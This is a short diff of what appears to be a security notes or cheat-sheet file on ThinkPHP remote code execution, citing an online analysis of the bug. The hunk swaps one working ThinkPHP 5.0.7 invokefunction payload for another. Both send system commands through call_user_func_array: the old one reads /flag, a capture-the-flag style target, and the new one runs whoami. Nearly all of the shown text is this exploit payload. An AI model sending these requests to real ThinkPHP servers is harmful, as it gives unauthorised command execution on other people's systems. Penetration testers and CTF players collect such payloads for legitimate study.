@@ -99,7 +99,7 @@ https://www.cnblogs.com/Mikasa-Ackerman/p/ThinkPhp-zhiRce-fen-xi.html
 Thinkphp 5.0.7
 
 ```
-/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/flag
+/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
 ```
 
 Thinkphp 5.0.x
